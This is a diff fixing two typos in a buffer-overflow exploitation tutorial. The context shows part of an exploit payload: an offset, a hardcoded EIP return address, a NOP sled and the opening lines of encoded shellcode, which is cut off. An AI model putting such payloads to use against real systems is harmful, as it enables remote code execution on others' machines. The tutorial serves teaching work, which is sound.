@@ -140,7 +140,7 @@ Remember to reset the binary anytime it crashes.
 
 ### Writing code to interact with the Application and Fuzzing
 
-First of all one thing we need to do is figure out if and here an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.
+First of all one thing we need to do is figure out if and where an application is vulnerable. There are two ways to do this, a White Box approach and a Black Box approach.
 
 In a White Box approach you'd analyze the binary (or the source code) for functions you know are vulnerable to stack buffer overflows.
 
@@ -403,7 +403,7 @@ So finally our payload should look something like:
 offset = 2026
 overflow = 'A' * offset
 EIP = '\xaf\x11\x50\x62'
-padding = 'x90' * 16
+padding = '\x90' * 16
 shellcode = (
 "\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
 "\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6"
